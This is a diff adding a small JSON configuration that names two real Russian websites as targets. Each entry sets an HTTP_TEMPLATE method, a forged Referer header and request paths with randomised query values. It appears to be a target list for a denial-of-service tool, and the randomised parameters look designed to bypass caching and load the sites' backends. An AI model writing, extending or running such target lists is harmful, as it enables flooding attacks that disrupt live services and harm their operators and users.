@@ -1,0 +1,20 @@
+{
+  "targets": [
+    {
+      "target": "https://projahn-rus.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://projahn-rus.ru/\"}",
+        "path_qs": "/api/items?s={{str(1)}}&skip=0&limit=0"
+      }
+    },
+    {
+      "target": "https://www.starhit.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.starhit.ru/novosti/\"}",
+        "path_qs": "/_get/novosti/?page={{int(1,3500)}}"
+      }
+    }
+  ]
+}
